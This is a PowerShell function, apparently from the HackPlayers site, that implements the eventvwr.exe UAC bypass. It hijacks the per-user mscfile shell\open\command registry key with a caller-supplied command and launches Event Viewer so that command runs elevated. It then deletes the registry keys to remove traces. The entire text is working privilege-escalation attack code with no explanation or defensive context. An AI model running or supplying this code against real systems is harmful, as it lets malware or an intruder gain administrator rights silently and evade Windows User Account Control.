function BypassUAC-HackPlayers-Eventvwr {
param ([string]$comando)
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | out-null  
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | out-null
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | out-null
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | out-null
$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" 
set-item $Key $comando
Start-Process eventvwr.exe ; sleep -Seconds 3
Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | out-null
Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\  | out-null
Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | out-null
Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | out-null
}
